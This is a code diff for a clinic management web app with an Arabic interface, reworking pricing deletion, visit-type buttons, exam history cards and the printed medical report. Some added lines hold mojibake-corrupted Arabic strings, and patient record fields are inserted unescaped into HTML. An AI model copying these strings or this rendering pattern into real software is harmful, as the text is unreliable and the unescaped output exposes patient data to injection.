+        window.deletePricingService = function(serviceName) {
             if (!window.pricingTable) return;
-            if (confirm(`هل أنت متأكد من حذف خدمة "${serviceName}"؟`)) {
+            if (confirm(`Ù‡Ù„ Ø£Ù†Øª Ù…ØªØ£ÙƒØ¯ Ù…Ù† Ø­Ø°Ù Ø®Ø¯Ù…Ø© "${serviceName}"ØŸ`)) {
                 delete window.pricingTable[serviceName];
-                
-                try {
-                    window.clinicSettings.pricingTable = window.pricingTable;
-                    // Also remove from allowedServices for online booking if present
-                    if (window.clinicSettings.booking && window.clinicSettings.booking.allowedServices) {
-                        window.clinicSettings.booking.allowedServices = window.clinicSettings.booking.allowedServices.filter(s => s !== serviceName);
-                        await update(ref(firebaseDb, 'settings/booking'), { allowedServices: window.clinicSettings.booking.allowedServices });
-                    }
-                    
-                    localStorage.setItem('c_settings', JSON.stringify(window.clinicSettings));
-                    await update(ref(firebaseDb, 'settings'), { pricingTable: window.pricingTable });
-                    
-                    showToast('تم حذف الخدمة بنجاح ✓', 'success');
-                    renderPricingSettings();
-                    renderVisitTypeButtons();
-                    if (window.renderBookingServicesSettings) window.renderBookingServicesSettings();
-                } catch (err) {
-                    console.error(err);
-                    showToast('خطأ في حذف الخدمة', 'error');
-                }
+                renderPricingSettings();
+                showToast('ØªÙ… Ø­Ø°Ù Ø§Ù„Ø®Ø¯Ù…Ø© Ù…Ø¤Ù‚ØªØ§Ù‹ØŒ Ø§Ø¶ØºØ· Ø­ÙØ¸ Ù„ØªØ£ÙƒÙŠØ¯ Ø§Ù„ØªØ¹Ø¯ÙŠÙ„Ø§Øª', 'info');
             }
         };
 
@@ -8094,7 +7709,16 @@
                                             <input type="number" class="form-control" id="tabExamAmount" value="${window.pricingTable['كشف عادي'] || 100}">
                                         </div>
                                     </div>
-
+                                    <div class="sugar-test-card" id="sugarTestCard" onclick="window.toggleTabSugarTest()">
+                                        <input type="checkbox" id="tabSugarTest" style="display:none;">
+                                        <div class="sugar-card-content">
+                                            <div class="sugar-card-icon"><i class="fas fa-flask"></i></div>
+                                            <div class="sugar-card-text">
+                                                <span class="fw-bold d-block text-white" style="font-size:13px">تحليل سكر (+15ج)</span>
+                                            </div>
+                                            <div class="sugar-card-check" id="sugarCardCheck"><i class="fas fa-check-circle"></i></div>
+                                        </div>
+                                    </div>
                                 </div>
                                 <div class="clinical-section border-danger-glow">
                                     <div class="clinical-title"><i class="fas fa-heartbeat"></i> العلامات الحيوية</div>
@@ -8179,8 +7803,7 @@
                     </form>
                 </div>
             `;
-            const examTypes = Object.keys(window.pricingTable || {}).filter(k => k.startsWith('كشف'));
-            renderVisitTypeButtonsTab('tabVisitTypeButtons', 'tabVisitType', examTypes.length > 0 ? examTypes : ['كشف عادي', 'كشف مستعجل']);
+            renderVisitTypeButtonsTab('tabVisitTypeButtons', 'tabVisitType', ['كشف عادي', 'كشف مستعجل', 'كشف لياقة', 'كشف منزلي']);
             setupBmiLogic('tabWeight', 'tabHeight', 'tabBmiVal', 'tabObesityVal');
             setupNextApptLogic('tabNextApptDate', 'tabNextApptDay');
             tryInjectUltrasound(container);
@@ -8210,7 +7833,16 @@
                                             <input type="number" class="form-control" id="tabExamAmount" value="${window.pricingTable['متابعة عادية'] || 50}">
                                         </div>
                                     </div>
-
+                                    <div class="sugar-test-card" id="sugarTestCard" onclick="window.toggleTabSugarTest()">
+                                        <input type="checkbox" id="tabSugarTest" style="display:none;">
+                                        <div class="sugar-card-content">
+                                            <div class="sugar-card-icon"><i class="fas fa-flask"></i></div>
+                                            <div class="sugar-card-text">
+                                                <span class="fw-bold d-block text-white" style="font-size:13px">تحليل سكر (+15ج)</span>
+                                            </div>
+                                            <div class="sugar-card-check" id="sugarCardCheck"><i class="fas fa-check-circle"></i></div>
+                                        </div>
+                                    </div>
                                 </div>
                                 <div class="clinical-section border-warning-glow">
                                     <div class="clinical-title"><i class="fas fa-heartbeat"></i> العلامات الحيوية</div>
@@ -8294,8 +7926,7 @@
                     </form>
                 </div>
             `;
-            const followTypes = Object.keys(window.pricingTable || {}).filter(k => k.startsWith('متابعة'));
-            renderVisitTypeButtonsTab('tabFollowTypeButtons', 'tabVisitType', followTypes.length > 0 ? followTypes : ['متابعة عادية', 'متابعة نهارا']);
+            renderVisitTypeButtonsTab('tabFollowTypeButtons', 'tabVisitType', ['متابعة عادية', 'متابعة نهارا', 'متابعة ليلا', 'متابعة منزلية']);
             setupBmiLogic('tabWeight', 'tabHeight', 'tabBmiVal', 'tabObesityVal');
             setupNextApptLogic('tabNextApptDate', 'tabNextApptDay');
             tryInjectUltrasound(container);
@@ -9040,29 +8671,6 @@
             }
         };
 
-        window.renderBookingServicesSettings = function() {
-            const container = document.getElementById('bookingServicesList');
-            if (!container) return;
-            
-            const currentPricing = window.pricingTable || {};
-            const allowed = window.clinicSettings.booking?.allowedServices || [];
-            
-            if (Object.keys(currentPricing).length === 0) {
-                container.innerHTML = '<div class="text-white-50 small">يرجى إضافة خدمات وأسعار أولاً لتحديدها للحجز.</div>';
-                return;
-            }
-            
-            container.innerHTML = Object.keys(currentPricing).map(service => {
-                const isChecked = allowed.length === 0 || allowed.includes(service);
-                return `
-                    <div class="form-check">
-                        <input class="form-check-input set-booking-service-checkbox" type="checkbox" value="${service}" id="bks_${service}" ${isChecked ? 'checked' : ''}>
-                        <label class="form-check-label text-white" for="bks_${service}">${service}</label>
-                    </div>
-                `;
-            }).join('');
-        };
-
         window.savePricingSettings = async function () {
             const pricing = {};
             document.querySelectorAll('.pricing-input').forEach(inp => {
@@ -9072,7 +8680,6 @@
                 // Update local state
                 window.pricingTable = pricing;
                 window.clinicSettings.pricingTable = pricing;
-                localStorage.setItem('c_settings', JSON.stringify(window.clinicSettings));
 
                 // Save to Firebase (consistent with loadSettings which expects it inside settings)
                 await update(ref(firebaseDb, 'settings'), { pricingTable: pricing });
@@ -9080,7 +8687,6 @@
                 showToast('تم حفظ الأسعار بنجاح ✓', 'success');
                 renderPricingSettings(); // Ensure inputs show current saved state
                 renderVisitTypeButtons(); // Refresh badges
-                if (window.renderBookingServicesSettings) window.renderBookingServicesSettings();
             } catch (e) {
                 console.error(e);
                 showToast('خطأ في حفظ الأسعار', 'error');
@@ -9264,114 +8870,13 @@
                         </div>
                     </div>`;
 
-                                // Retrieve medications list for this examination (examMedNames)
-                const linkedPresc = Object.values(window.allPrescriptions || {}).find(pr => pr.examId === ek);
-                let examMedNames = [];
-                if (linkedPresc) {
-                    if (linkedPresc.medications && linkedPresc.medications.length > 0) {
-                        examMedNames = linkedPresc.medications.map(m => m.name);
-                    } else if (linkedPresc.prescriptionText) {
-                        examMedNames = linkedPresc.prescriptionText.split('\n').map(s => s.replace(/^-+/, '').trim()).filter(s => s);
-                    }
-                }
-                if (examMedNames.length === 0) {
-                    if (ex.meds && ex.meds.length > 0) {
-                        examMedNames = ex.meds.map(m => m.name);
-                    } else if (ex.prescriptionText) {
-                        examMedNames = ex.prescriptionText.split('\n').map(s => s.replace(/^-+/, '').trim()).filter(s => s);
-                    }
-                }
-
-                let cardsHtml = '';
-
-                // 1. التاريخ المرضي
-                if (ex.medicalHistory) {
-                    cardsHtml += `
-                    <div class="col-md-6">
-                        <div style="background: rgba(59, 130, 246, 0.08); border: 1px solid rgba(59, 130, 246, 0.2); border-radius: 12px; padding: 12px; transition: all 0.3s; box-shadow: 0 4px 15px rgba(0,0,0,0.02); height: 100%;" onmouseover="this.style.transform='translateY(-2px)'" onmouseout="this.style.transform='translateY(0)'">
-                            <span style="font-size: 10px; color: #3b82f6; font-weight: 900; display: flex; align-items: center; gap: 6px; margin-bottom: 8px;"><i class="fas fa-file-medical"></i> التاريخ المرضي</span>
-                            <div style="font-size: 12.5px; font-weight: 700; color: var(--text); line-height: 1.6; white-space: pre-wrap;">${ex.medicalHistory}</div>
-                        </div>
-                    </div>`;
-                }
-
-                // 2. الشكوى
-                if (ex.chiefComplaint) {
-                    cardsHtml += `
-                    <div class="col-md-6">
-                        <div style="background: rgba(245, 158, 11, 0.08); border: 1px solid rgba(245, 158, 11, 0.2); border-radius: 12px; padding: 12px; transition: all 0.3s; box-shadow: 0 4px 15px rgba(0,0,0,0.02); height: 100%;" onmouseover="this.style.transform='translateY(-2px)'" onmouseout="this.style.transform='translateY(0)'">
-                            <span style="font-size: 10px; color: #f59e0b; font-weight: 900; display: flex; align-items: center; gap: 6px; margin-bottom: 8px;"><i class="fas fa-exclamation-circle"></i> الشكوى</span>
-                            <div style="font-size: 12.5px; font-weight: 700; color: var(--text); line-height: 1.6; white-space: pre-wrap;">${ex.chiefComplaint}</div>
-                        </div>
-                    </div>`;
-                }
-
-                // 3. التشخيص
-                if (ex.diagnosis) {
-                    cardsHtml += `
-                    <div class="col-12">
-                        <div style="background: rgba(244, 63, 94, 0.08); border: 1px solid rgba(244, 63, 94, 0.2); border-radius: 12px; padding: 12px; transition: all 0.3s; box-shadow: 0 4px 15px rgba(0,0,0,0.02); height: 100%;" onmouseover="this.style.transform='translateY(-2px)'" onmouseout="this.style.transform='translateY(0)'">
-                            <span style="font-size: 10px; color: #f43f5e; font-weight: 900; display: flex; align-items: center; gap: 6px; margin-bottom: 8px;"><i class="fas fa-stethoscope"></i> التشخيص</span>
-                            <div style="font-size: 12.5px; font-weight: 700; color: var(--text); line-height: 1.6; white-space: pre-wrap;">${ex.diagnosis}</div>
-                        </div>
-                    </div>`;
-                }
-
-                // 4. الأدوية السابقة
-                if (examMedNames.length > 0) {
-                    cardsHtml += `
-                    <div class="col-12">
-                        <div style="background: rgba(16, 185, 129, 0.08); border: 1px solid rgba(16, 185, 129, 0.2); border-radius: 12px; padding: 12px; transition: all 0.3s; box-shadow: 0 4px 15px rgba(0,0,0,0.02); height: 100%;" onmouseover="this.style.transform='translateY(-2px)'" onmouseout="this.style.transform='translateY(0)'">
-                            <span style="font-size: 10px; color: #10b981; font-weight: 900; display: flex; align-items: center; gap: 6px; margin-bottom: 8px;"><i class="fas fa-pills"></i> الأدوية السابقة</span>
-                            <div style="font-size: 12.5px; font-weight: 700; color: var(--text); line-height: 1.6;">
-                                <ul style="padding-right: 22px; margin: 0; list-style-type: disc;">${examMedNames.map(m => `<li style="margin-bottom: 3px;">${m}</li>`).join('')}</ul>
-                            </div>
-                        </div>
-                    </div>`;
-                }
-
-                // 5. العلاج / خطة العلاج
-                if (ex.treatmentPlan) {
-                    cardsHtml += `
-                    <div class="col-12">
-                        <div style="background: rgba(139, 92, 246, 0.08); border: 1px solid rgba(139, 92, 246, 0.2); border-radius: 12px; padding: 12px; transition: all 0.3s; box-shadow: 0 4px 15px rgba(0,0,0,0.02); height: 100%;" onmouseover="this.style.transform='translateY(-2px)'" onmouseout="this.style.transform='translateY(0)'">
-                            <span style="font-size: 10px; color: #8b5cf6; font-weight: 900; display: flex; align-items: center; gap: 6px; margin-bottom: 8px;"><i class="fas fa-clipboard-list"></i> ${examMedNames.length > 0 ? 'خطة العلاج' : 'العلاج'}</span>
-                            <div style="font-size: 12.5px; font-weight: 700; color: var(--text); line-height: 1.6; white-space: pre-wrap;">${ex.treatmentPlan}</div>
-                        </div>
-                    </div>`;
-                }
-
-                // 6. رسم القلب (ECG)
-                if (ex.ecg) {
-                    cardsHtml += `
-                    <div class="col-12">
-                        <div style="background: rgba(14, 165, 233, 0.08); border: 1px solid rgba(14, 165, 233, 0.2); border-radius: 12px; padding: 12px; transition: all 0.3s; box-shadow: 0 4px 15px rgba(0,0,0,0.02); height: 100%;" onmouseover="this.style.transform='translateY(-2px)'" onmouseout="this.style.transform='translateY(0)'">
-                            <span style="font-size: 10px; color: #0ea5e9; font-weight: 900; display: flex; align-items: center; gap: 6px; margin-bottom: 8px;"><i class="fas fa-wave-square"></i> رسم القلب (ECG)</span>
-                            <div style="font-size: 12.5px; font-weight: 700; color: var(--text); line-height: 1.6; white-space: pre-wrap;">${ex.ecg}</div>
-                        </div>
-                    </div>`;
-                }
-
-                // 7. الاشعة التلفزيونية (Ultrasound)
-                if (ex.ultrasound && ex.ultrasound.type) {
-                    cardsHtml += `
-                    <div class="col-12">
-                        <div style="background: rgba(6, 182, 212, 0.08); border: 1px solid rgba(6, 182, 212, 0.2); border-radius: 12px; padding: 12px; transition: all 0.3s; box-shadow: 0 4px 15px rgba(0,0,0,0.02);" onmouseover="this.style.transform='translateY(-2px)'" onmouseout="this.style.transform='translateY(0)'">
-                            <span style="font-size: 10px; color: #06b6d4; font-weight: 900; display: flex; align-items: center; gap: 6px; margin-bottom: 8px;"><i class="fas fa-procedures"></i> الأشعة التلفزيونية (${ex.ultrasound.typeName || ex.ultrasound.type})</span>
-                            <div class="table-responsive" style="margin-top: 8px;">
-                                <table class="table table-sm m-0" style="font-size:12px; background: transparent !important; border-color: rgba(255,255,255,0.1) !important;">
-                                    <tbody>
-                                        ${Object.entries(ex.ultrasound.fields || {}).filter(([k,v]) => v).map(([label, val]) => `
-                                            <tr style="background: transparent !important;"><td class="fw-bold text-white" style="width: 30%; background: transparent !important; color: #ffffff !important; border-color: rgba(255,255,255,0.1) !important; padding: 4px 0;">${label}</td><td class="text-white-50" style="background: transparent !important; color: rgba(255,255,255,0.85) !important; border-color: rgba(255,255,255,0.1) !important; padding: 4px 8px;">${val}</td></tr>
-                                        `).join('')}
-                                        ${ex.ultrasound.findings ? `<tr style="background: transparent !important;"><td class="fw-bold text-white" style="width: 30%; background: transparent !important; color: #ffffff !important; border-color: rgba(255,255,255,0.1) !important; padding: 4px 0;">Findings</td><td class="text-white" style="background: transparent !important; color: #ffffff !important; border-color: rgba(255,255,255,0.1) !important; padding: 4px 8px;">${ex.ultrasound.findings}</td></tr>` : ''}
-                                        ${ex.ultrasound.impression ? `<tr style="background: transparent !important;"><td class="fw-bold text-success" style="width: 30%; background: transparent !important; color: #10b981 !important; border-color: rgba(255,255,255,0.1) !important; padding: 4px 0;">Impression</td><td class="fw-bold text-success" style="background: transparent !important; color: #10b981 !important; border-color: rgba(255,255,255,0.1) !important; padding: 4px 8px;">${ex.ultrasound.impression}</td></tr>` : ''}
-                                    </tbody>
-                                </table>
-                            </div>
-                        </div>
-                    </div>`;
-                }
+                const sections = [
+                    { label: 'التاريخ المرضي', value: ex.medicalHistory, icon: 'fa-history', color: '#10b981' },
+                    { label: 'الشكوى', value: ex.chiefComplaint, icon: 'fa-bullhorn', color: '#f59e0b' },
+                    { label: 'التشخيص', value: ex.diagnosis, icon: 'fa-microscope', color: '#ef4444', full: true },
+                    { label: 'رسم القلب (ECG)', value: ex.ecg, icon: 'fa-wave-square', color: '#0ea5e9', full: true },
+                    { label: 'العلاج', value: ex.treatmentPlan, icon: 'fa-clipboard-list', color: '#8b5cf6', full: true }
+                ].filter(s => s.value);
 
                 return `
                 <div class="exam-accordion mb-3 border ${isFollowup ? 'border-warning-glow' : 'border-danger-glow'} rounded-4 overflow-hidden" style="background:var(--surface-glass); backdrop-filter:blur(10px)">
@@ -9394,7 +8899,14 @@
                     <div class="exam-accordion-body p-3">
                         ${vitalSigns}
                         <div class="row g-3">
-                            ${cardsHtml}
+                            ${sections.map(s => `
+                                <div class="${s.full ? 'col-12' : 'col-md-6'}">
+                                    <div class="p-3 rounded-4 border-start border-4" style="border-left-color:${s.color} !important; background:rgba(255,255,255,0.03)">
+                                        <div class="fw-bold small mb-1" style="color:${s.color}"><i class="fas ${s.icon} me-1"></i> ${s.label}</div>
+                                        <div class="text-white fw-bold" style="font-size:13px; white-space:pre-wrap">${s.value}</div>
+                                    </div>
+                                </div>
+                            `).join('')}
                             ${ex.echo && Object.values(ex.echo).some(v => v) ? `
                                 <div class="col-12">
                                     <div class="clinical-section border-info-glow p-3">
@@ -9797,10 +9309,8 @@
         }
 
         function renderPatientAppointmentsTab(container, key, p) {
-            const appts = Object.entries(window.allAppointments)
-                .filter(([k, a]) => a.patientId === key || a.patientName === p.name)
-                .map(([k, a]) => ({ ...a, key: k }))
-                .sort((a, b) => (b.createdAt || 0) - (a.createdAt || 0));
+            const appts = Object.values(window.allAppointments).filter(a => a.patientId === key || a.patientName === p.name).sort((a, b) => (b
+                .createdAt || 0) - (a.createdAt || 0));
             if (appts.length === 0) {
                 container.innerHTML = '<div class="text-muted text-center py-5">لا توجد مواعيد مسجلة</div>'; return;
             }
@@ -10389,76 +9899,64 @@ if (ex.ultrasound) {
                 <html dir="rtl"><head><meta charset="UTF-8">
                 <style>
                     @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap');
-                    @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&display=swap');
-                    @page { size: A4; margin: 15mm 20mm; }
-                    * { box-sizing: border-box; margin: 0; padding: 0; }
-                    body { font-family: 'Cairo', 'Segoe UI', sans-serif; color: #111; line-height: 1.7; font-size: 13px; background: #fff; }
-                    .clinic-header { background: #ebebeb; border-bottom: 3px solid #333; padding: 16px 22px; display: flex; justify-content: space-between; align-items: center; }
-                    .doc-name { font-size: 22px; font-weight: 900; color: #111; }
-                    .doc-spec { font-size: 12px; color: #333; font-weight: 700; border: 1px solid #999; display: inline-block; padding: 1px 8px; border-radius: 4px; margin-top: 4px; }
-                    .clinic-contact { font-size: 11px; color: #555; margin-top: 4px; }
-                    .clinic-header img { max-height: 70px; border-radius: 6px; }
-                    .report-title { text-align: center; padding: 10px; background: #ddd; border-bottom: 2px solid #aaa; font-size: 15px; font-weight: 900; color: #111; letter-spacing: 0.5px; }
-                    table { width: 100%; border-collapse: collapse; }
-                    th { background: #e0e0e0 !important; color: #111 !important; font-weight: 800; border: 1px solid #bbb; padding: 8px 12px; text-align: right; font-size: 12px; }
-                    td { border: 1px solid #ccc; padding: 8px 12px; font-size: 13px; color: #111; font-weight: 600; background: #fff; }
-                    .section-wrap { margin-top: 14px; page-break-inside: avoid; }
-                    .section-hd { background: #e0e0e0; color: #111; font-weight: 900; font-size: 13px; padding: 7px 14px; border: 1px solid #bbb; border-bottom: none; }
-                    .section-bd { border: 1px solid #ccc; padding: 10px 14px; background: #fff; white-space: pre-wrap; font-size: 13px; line-height: 1.9; color: #111; font-weight: 600; }
-                    .print-footer { margin-top: 40px; border-top: 2px solid #aaa; padding-top: 14px; display: flex; justify-content: space-between; align-items: flex-end; font-size: 11px; color: #444; }
-                    .sig-line { border-top: 1px solid #333; width: 200px; margin: 28px auto 6px; }
-                    .sig-lbl { font-size: 11px; font-weight: 700; text-align: center; }
+                    body { font-family: 'Cairo', sans-serif; padding: 40px; color: #1e293b; line-height: 1.6; }
+                    .header { display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid #e2e8f0; padding-bottom: 20px; margin-bottom: 30px; }
+                    .header-info h1 { margin: 0; color: #6366f1; font-weight: 900; font-size: 24px; }
+                    .patient-box { background: #f8fafc; border-radius: 12px; padding: 20px; margin-bottom: 30px; border: 1px solid #e2e8f0; }
+                    .patient-box table { width: 100%; }
+                    .patient-box td { padding: 5px 0; }
+                    .section { margin-bottom: 25px; }
+                    .section-title { font-weight: 900; color: #6366f1; border-bottom: 2px solid #6366f1; display: inline-block; margin-bottom: 10px; }
+                    .echo-table { width: 100%; border-collapse: collapse; margin-top: 10px; }
+                    .echo-table th, .echo-table td { border: 1px solid #e2e8f0; padding: 8px 15px; text-align: right; }
+                    .echo-table th { background: #f1f5f9; font-weight: 900; }
+                    .vitals-grid { display: flex; gap: 20px; flex-wrap: wrap; margin-bottom: 20px; }
+                    .vital-item { background: #f1f5f9; padding: 10px 20px; border-radius: 8px; }
+                    .footer { text-align: center; margin-top: 50px; font-size: 12px; color: #94a3b8; border-top: 1px solid #e2e8f0; padding-top: 20px; }
                 </style>
                 </head><body>
-                    <div class="clinic-header">
-                        <div>
-                            <div class="doc-name">${window.clinicSettings.doctorName || 'الطبيب'}</div>
-                            <div class="doc-spec">${window.clinicSettings.specialty || ''}</div>
-                            ${(window.clinicSettings.clinicName || window.clinicSettings.clinicPhone) ? `<div class="clinic-contact">${window.clinicSettings.clinicName || ''}${window.clinicSettings.clinicPhone ? ' | هاتف: ' + window.clinicSettings.clinicPhone : ''}${window.clinicSettings.clinicAddress ? ' | ' + window.clinicSettings.clinicAddress : ''}</div>` : ''}
+                    <div class="header">
+                        <div class="header-info">
+                            <h1>${window.clinicSettings.doctorName}</h1>
+                            <div>${window.clinicSettings.specialty}</div>
                         </div>
-                        ${logo ? `<img src="${logo}">` : ''}
+                        ${logo ? `<img src="${logo}" style="max-height:80px">` : ''}
                     </div>
-                    <div class="report-title">تقرير طبي — ${ex.visitType || 'كشف / متابعة'}</div>
-                    <table style="margin-top:0">
-                        <tr>
-                            <th width="25%">اسم المريض</th><td width="25%">${ex.patientName || '-'}</td>
-                            <th width="25%">التاريخ</th><td width="25%">${formatDateWithDay(ex.examDate)}</td>
-                        </tr>
-                        <tr>
-                            <th>نوع الزيارة</th><td>${ex.visitType || '-'}</td>
-                            <th>المبلغ</th><td>${ex.amount ? ex.amount + ' جنيه' : '-'}</td>
-                        </tr>
-                    </table>
-                    ${(ex.bloodPressure || ex.pulse || ex.temperature || ex.oxygen || ex.weight || ex.bmi) ? `
-                    <div class="section-wrap">
-                        <div class="section-hd">⚡ العلامات الحيوية</div>
-                        <table><thead><tr><th>الضغط</th><th>النبض</th><th>الحرارة °C</th><th>الأكسجين %</th><th>الوزن</th><th>BMI</th></tr></thead>
-                        <tbody><tr>
-                            <td style="text-align:center">${ex.bloodPressure || '-'}</td>
-                            <td style="text-align:center">${ex.pulse || '-'}</td>
-                            <td style="text-align:center">${ex.temperature || '-'}</td>
-                            <td style="text-align:center">${ex.oxygen || '-'}</td>
-                            <td style="text-align:center">${ex.weight || '-'}</td>
-                            <td style="text-align:center">${ex.bmi || '-'}</td>
-                        </tr></tbody></table>
-                    </div>` : ''}
+                    <h2 style="text-align:center; color:#1e293b; margin-bottom:30px">تقرير طبي كشف / متابعة</h2>
+                    <div class="patient-box">
+                        <table>
+                            <tr>
+                                <td width="50%"><strong>المريض:</strong> ${ex.patientName}</td>
+                                <td width="50%"><strong>التاريخ:</strong> ${formatDateWithDay(ex.examDate)}</td>
+                            </tr>
+                            <tr>
+                                <td><strong>النوع:</strong> ${ex.visitType}</td>
+                                <td><strong>المبلغ:</strong> ${ex.amount} ج</td>
+                            </tr>
+                        </table>
+                    </div>
+                    <div class="vitals-grid">
+                        <div class="vital-item">الضغط: <strong>${ex.bloodPressure || '-'}</strong></div>
+                        <div class="vital-item">النبض: <strong>${ex.pulse || '-'}</strong></div>
+                        <div class="vital-item">الحرارة: <strong>${ex.temperature || '-'}°C</strong></div>
+                        <div class="vital-item">الأكسجين: <strong>${ex.oxygen || '-'}%</strong></div>
+                        <div class="vital-item">BMI: <strong>${ex.bmi || '-'}</strong></div>
+                    </div>
                     ${sections.map(s => `
-                        <div class="section-wrap">
-                            <div class="section-hd">◈ ${s.label}</div>
-                            <div class="section-bd">${s.val}</div>
+                        <div class="section">
+                            <div class="section-title">${s.label}</div>
+                            <div style="white-space:pre-wrap; padding: 5px 10px">${s.val}</div>
                         </div>
                     `).join('')}
                     ${echoRows ? `
-                        <div class="section-wrap">
-                            <div class="section-hd">🔬 تقرير الإيكو / الأشعة التلفزيونية</div>
-                            <table><thead><tr><th>القياس / الحقل</th><th>النتيجة</th></tr></thead>
-                            <tbody>${echoRows}</tbody></table>
+                        <div class="section">
+                            <div class="section-title">تقرير الإيكو (Echo Report)</div>
+                            <table class="echo-table">
+                                <thead><tr><th>القياس</th><th>النتيجة</th></tr></thead>
+                                <tbody>${echoRows}</tbody>
+                            </table>
                         </div>
                     ` : ''}
-                    <div class="print-footer">
-                        <div>تاريخ الطباعة: ${new Date().toLocaleDateString('ar-EG', { year: 'numeric', month: 'long', day: 'numeric' })}</div>
-                        <div><div class="sig-line"></div><div class="sig-lbl">توقيع الطبيب — ${window.clinicSettings.doctorName || ''}</div></div>
-                    </div>
                     <div class="footer">توقيع الطبيب: ........................................</div>
                 
 
@@ -11898,12 +11396,12 @@ if (ex.ultrasound) {
 </body>
 
 <!-- ================= ULTRASOUND MODULE INJECTION ================= -->
-    <script>
-    const US_TEMPLATES = {
+<script>
+const US_TEMPLATES = {
     abdominal: `
         <h5 class="fw-bold text-primary mb-3"><i class="fas fa-procedures"></i> Abdominal Ultrasound</h5>
         <div class="row g-3">
-            <div class="col-12"><h6 class="text-accent fw-bold border-bottom pb-1 mb-2" style="font-size:13.5px;"><i class="fas fa-dot-circle me-1"></i> Liver & Gallbladder (الكبد والمرارة)</h6></div>
+            <div class="col-12"><h6 class="text-accent fw-bold border-bottom pb-1 mb-2" style="font-size:13.5px;"><i class="fas fa-dot-circle me-1"></i> Liver & Gallbladder (Ø§Ù„ÙƒØ¨Ø¯ ÙˆØ§Ù„Ù…Ø±Ø§Ø±Ø©)</h6></div>
             <div class="col-md-4"><label class="form-label">Liver Length</label><input type="text" class="form-control us-field" data-field="Liver Length" placeholder="e.g. 14 cm"></div>
             <div class="col-md-4"><label class="form-label">Echogenicity</label><input type="text" class="form-control us-field" data-field="Liver Echogenicity" placeholder="Normal/Increased"></div>
             <div class="col-md-4"><label class="form-label">Fatty Liver Grade</label><select class="form-select us-field" data-field="Fatty Liver Grade"><option value="None">None</option><option value="Grade 1">Grade 1</option><option value="Grade 2">Grade 2</option><option value="Grade 3">Grade 3</option></select></div>
@@ -11913,11 +11411,11 @@ if (ex.ultrasound) {
             <div class="col-md-4"><label class="form-label">GB Polyps</label><input type="text" class="form-control us-field" data-field="GB Polyps" placeholder="..."></div>
             <div class="col-md-12"><label class="form-label">Biliary Tree Dilatation</label><select class="form-select us-field" data-field="Biliary Tree Dilatation"><option value="No">No</option><option value="Yes">Yes</option></select></div>
             
-            <div class="col-12 mt-3"><h6 class="text-accent fw-bold border-bottom pb-1 mb-2" style="font-size:13.5px;"><i class="fas fa-dot-circle me-1"></i> Pancreas & Spleen (البنكرياس والطحال)</h6></div>
+            <div class="col-12 mt-3"><h6 class="text-accent fw-bold border-bottom pb-1 mb-2" style="font-size:13.5px;"><i class="fas fa-dot-circle me-1"></i> Pancreas & Spleen (Ø§Ù„Ø¨Ù†ÙƒØ±ÙŠØ§Ø³ ÙˆØ§Ù„Ø·Ø­Ø§Ù„)</h6></div>
             <div class="col-md-6"><label class="form-label">Pancreas</label><input type="text" class="form-control us-field" data-field="Pancreas" placeholder="Normal..."></div>
             <div class="col-md-6"><label class="form-label">Spleen Length</label><input type="text" class="form-control us-field" data-field="Spleen Length" placeholder="e.g. 11 cm"></div>
             
-            <div class="col-12 mt-3"><h6 class="text-accent fw-bold border-bottom pb-1 mb-2" style="font-size:13.5px;"><i class="fas fa-dot-circle me-1"></i> Kidneys (الكلى)</h6></div>
+            <div class="col-12 mt-3"><h6 class="text-accent fw-bold border-bottom pb-1 mb-2" style="font-size:13.5px;"><i class="fas fa-dot-circle me-1"></i> Kidneys (Ø§Ù„ÙƒÙ„Ù‰)</h6></div>
             <div class="col-md-6"><label class="form-label">Right Kidney Size</label><input type="text" class="form-control us-field" data-field="Right Kidney Size" placeholder="L x W"></div>
             <div class="col-md-6"><label class="form-label">Left Kidney Size</label><input type="text" class="form-control us-field" data-field="Left Kidney Size" placeholder="L x W"></div>
             <div class="col-md-4"><label class="form-label">Kidney Stones</label><input type="text" class="form-control us-field" data-field="Kidney Stones" placeholder="..."></div>
@@ -11928,14 +11426,14 @@ if (ex.ultrasound) {
     pelvic: `
         <h5 class="fw-bold text-primary mb-3"><i class="fas fa-venus"></i> Pelvic Ultrasound</h5>
         <div class="row g-3">
-            <div class="col-12"><h6 class="text-accent fw-bold border-bottom pb-1 mb-2" style="font-size:13.5px;"><i class="fas fa-dot-circle me-1"></i> Uterus (الرحم)</h6></div>
+            <div class="col-12"><h6 class="text-accent fw-bold border-bottom pb-1 mb-2" style="font-size:13.5px;"><i class="fas fa-dot-circle me-1"></i> Uterus (Ø§Ù„Ø±Ø­Ù…)</h6></div>
             <div class="col-md-3"><label class="form-label">Uterus Length</label><input type="text" class="form-control us-field" data-field="Uterus Length" placeholder="cm"></div>
             <div class="col-md-3"><label class="form-label">Uterus Width</label><input type="text" class="form-control us-field" data-field="Uterus Width" placeholder="cm"></div>
             <div class="col-md-3"><label class="form-label">Uterus AP</label><input type="text" class="form-control us-field" data-field="Uterus AP" placeholder="cm"></div>
             <div class="col-md-3"><label class="form-label">Position</label><select class="form-select us-field" data-field="Uterus Position"><option value="AVF">AVF</option><option value="RVF">RVF</option></select></div>
             <div class="col-md-12"><label class="form-label">Endometrium Thickness</label><input type="text" class="form-control us-field" data-field="Endometrium Thickness" placeholder="mm"></div>
             
-            <div class="col-12 mt-3"><h6 class="text-accent fw-bold border-bottom pb-1 mb-2" style="font-size:13.5px;"><i class="fas fa-dot-circle me-1"></i> Ovaries & Adnexa (المبايض)</h6></div>
+            <div class="col-12 mt-3"><h6 class="text-accent fw-bold border-bottom pb-1 mb-2" style="font-size:13.5px;"><i class="fas fa-dot-circle me-1"></i> Ovaries & Adnexa (Ø§Ù„Ù…Ø¨Ø§ÙŠØ¶)</h6></div>
             <div class="col-md-4"><label class="form-label">Right Ovary Dimensions</label><input type="text" class="form-control us-field" data-field="Right Ovary Dimensions" placeholder="L x W"></div>
             <div class="col-md-4"><label class="form-label">Right Cysts</label><input type="text" class="form-control us-field" data-field="Right Ovary Cysts" placeholder="..."></div>
             <div class="col-md-4"><label class="form-label">Right PCOS</label><select class="form-select us-field" data-field="Right PCOS"><option value="No">No</option><option value="Yes">Yes</option></select></div>
@@ -11950,11 +11448,11 @@ if (ex.ultrasound) {
     obstetric: `
         <h5 class="fw-bold text-primary mb-3"><i class="fas fa-baby"></i> Obstetric Ultrasound</h5>
         <div class="row g-3">
